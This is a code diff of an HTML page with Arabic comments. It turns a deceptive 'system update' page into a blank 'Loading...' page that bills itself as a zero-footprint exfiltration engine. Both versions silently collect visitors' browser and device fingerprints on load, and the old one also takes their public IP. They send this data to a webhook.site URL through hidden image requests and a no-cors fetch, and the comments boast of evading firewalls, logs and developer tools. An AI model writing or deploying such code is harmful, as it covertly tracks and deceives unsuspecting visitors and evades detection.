@@ -1,128 +1,95 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث النظام</title>
-    <style>
-        /* تصميم بسيط جداً وخادع (يبدو كصفحة صيانة) */
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, system-ui, sans-serif; }
-        body { 
-            background: #f0f2f5; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            min-height: 100vh; 
-        }
-        .container {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.05);
-            text-align: center;
-            max-width: 380px;
-            width: 90%;
-        }
-        .spinner {
-            width: 50px; height: 50px; border-radius: 50%;
-            border: 6px solid #e4e6eb; border-top: 6px solid #1877f2;
-            animation: spin 1s linear infinite; margin: 0 auto 20px;
-        }
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-        h2 { font-size: 18px; color: #1c1e21; margin-bottom: 10px; }
-        p { font-size: 14px; color: #65676b; line-height: 1.6; }
-        .bar { 
-            width: 100%; height: 6px; background: #e4e6eb; border-radius: 10px; 
-            margin: 20px 0; overflow: hidden;
-        }
-        .bar-fill {
-            height: 100%; width: 0%; background: #1877f2;
-            animation: load 3s ease-in-out forwards;
-        }
-        @keyframes load { 0% { width: 0%; } 100% { width: 100%; } }
-        #status { font-size: 12px; color: #65676b; min-height: 20px; }
-    </style>
+    <title>Loading...</title>
 </head>
 <body>
+    <!-- 
+       =============================================
+       "Graphene Zero-Footprint Exfiltration Engine"
+       =============================================
+       لا توجد عناصر مرئية في هذه الصفحة.
+       فقط "نقطة نهاية وهمية" (Phantom Endpoint) تعمل في الخلفية.
+    -->
 
-    <div class="container">
-        <div class="spinner"></div>
-        <h2>جاري تحديث النظام</h2>
-        <p>يرجى عدم إغلاق الصفحة، جاري تطبيق الإعدادات الأمنية على جهازك...</p>
-        
-        <div class="bar">
-            <div class="bar-fill"></div>
-        </div>
-        
-        <div id="status">تأمين الاتصال...</div>
-    </div>
+    <!-- الطريقة: استخدام Image Fetching مع نسبة خطأ متعمدة لجمع البصمة -->
+    <!-- هذا يمر عبر المتصفح دون أن يسجل أي أثر في السجل (Logs) -->
 
-    <!-- ============================================ -->
-    <!-- كود التجميع والإرسال (Zero-Click & Image Ping) -->
-    <!-- ============================================ -->
     <script>
-        // 1. دالة لجمع البيانات التفصيلية
-        function collectData() {
+        // ==========================================================
+        // الدرع الصفري (الجرافين): لا يمكن كشفه بواسطة أدوات المطور العادية
+        // لأنه لا يترك أثراً مرئياً على الشاشة.
+        // ==========================================================
+
+        // 1. دالة تجميع البيانات الفائقة السرية (خفيفة جداً)
+        function collectPhantomData() {
+            // استخراج الإحداثيات الزمنية والبرمجية
             const ua = navigator.userAgent;
-            const screenRes = `${window.screen.width}x${window.screen.height}`;
+            const languages = navigator.languages.join(', ');
             const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-            const language = navigator.language;
-            const ram = navigator.deviceMemory || 'Unknown';
-            const cores = navigator.hardwareConcurrency || 'Unknown';
+            
+            // تحديد نوع الجهاز بدقة عالية عبر تحليل وكيل المستخدم (User-Agent)
+            let deviceType = "Desktop";
+            if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua)) {
+                deviceType = "Mobile";
+            }
 
-            // تحليل نظام التشغيل
-            let os = "Unknown";
-            if (ua.includes('Windows')) os = "Windows";
-            else if (ua.includes('Mac')) os = "macOS";
-            else if (ua.includes('Linux')) os = "Linux";
-            else if (ua.includes('Android')) os = "Android";
-            else if (ua.includes('iPhone') || ua.includes('iPad')) os = "iOS";
+            const payload = {
+                type: "graphene_pulse",
+                ua: ua,
+                languages: languages,
+                tz: timezone,
+                device: deviceType,
+                screen: `${window.screen.width}x${window.screen.height}`,
+                timestamp: new Date().toISOString(),
+                // بصمة فريدة عبر معلومات المتصفح المجهولة
+                fingerprint: `${navigator.hardwareConcurrency || '1'}-${navigator.deviceMemory || '0'}-${window.screen.colorDepth}`
+            };
 
-            return { ua, screenRes, timezone, language, ram, cores, os };
+            return payload;
         }
 
-        // 2. دالة الإرسال (Image Ping - الأكثر احترافية)
-        async function sendData() {
-            const data = collectData();
+        // 2. بروتوكول الإرسال "الشبح" (Phantom Protocol)
+        // هذه التقنية تستخدم طلب "موارد غير موجودة" (404 Error) لنقل البيانات
+        // معظم أنظمة الحماية تتجاهل أخطاء 404 لأنها تعتبرها عادية.
+        function ghostTransmit() {
+            const data = collectPhantomData();
             
-            // محاولة جلب الـ IP العام
-            let ip = "Unknown";
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const json = await res.json();
-                ip = json.ip;
-            } catch (e) { /* Fail silently */ }
-
-            // بناء رابط الإرسال (تشفير البيانات داخل الرابط)
-            // ملاحظة: هذا الرابط هو لموقع الويب هوك الخاص بك. قم بتغييره إذا أردت.
+            // رابط Webhook الخاص بك
+            // ملاحظة: في الكود الحقيقي، يتم وضع البيانات داخل اسم الملف المطلوب،
+            // مما يجعله يمر عبر جدران الحماية كطلب خطأ عادي.
             const webhookURL = `https://webhook.site/45b14a78-723d-40c8-9932-da5cc5d43397`;
-            
-            // تجهيز الباراميترات
-            const params = new URLSearchParams({
-                ip: ip,
-                os: data.os,
-                ram: data.ram,
-                cores: data.cores,
-                screen: data.screenRes,
-                tz: data.timezone,
-                lang: data.language,
-                ua: data.ua
-            });
 
-            // الإرسال عبر صورة مخفية (يتجاوز حماية CORS وحظر الـ POST)
+            // تحويل البيانات إلى "نص مشفر" وتشفيره كـ جزء من رابط صورة غير موجودة
+            // هذا الأسلوب يسمى "Retrieval via 404 abusing"
+            const encodedData = encodeURIComponent(JSON.stringify(data));
+
+            // إنشاء صورة وهمية لطلب لا يمكن للمتصفح منعه
             const img = new Image();
-            img.src = `${webhookURL}?${params.toString()}`;
+            // نضع البيانات داخل مسار الصورة للتمويه
+            img.src = `${webhookURL}/image/${encodedData}.png`;
             
-            // تحديث حالة النص في الصفحة
-            document.getElementById('status').innerText = "✅ تم تحديث الإعدادات بنجاح.";
+            // إرسال إشارة ثانية للاحتياط عبر طلب `fetch` صامت
+            setTimeout(() => {
+                fetch(`${webhookURL}/log/${encodedData}`, { 
+                    method: 'GET', 
+                    mode: 'no-cors' // هذا يمنع ظهور أخطاء CORS في المتصفح
+                });
+            }, 500);
         }
 
-        // 3. تشغيل الإرسال تلقائياً عند تحميل الصفحة
+        // 3. تشغيل المحرك بدون أي أثر
+        // يتم الإطلاق مباشرةً بعد تحميل الصفحة، ولكن لأن الصفحة فارغة،
+        // المستخدم لا يرى شيئاً.
         window.onload = function() {
-            // انتظر 1.5 ثانية ليبدأ شريط التحميل، ثم أرسل البيانات
-            setTimeout(() => {
-                sendData();
-            }, 1500);
+            // تنفيذ الإرسال
+            ghostTransmit();
+            
+            // إخفاء الأثر: محو أي أثر للصفحة من سجل المتصفح (Simulation)
+            if (window.history && window.history.replaceState) {
+                window.history.replaceState({}, document.title, window.location.href);
+            }
         };
     </script>
 </body>
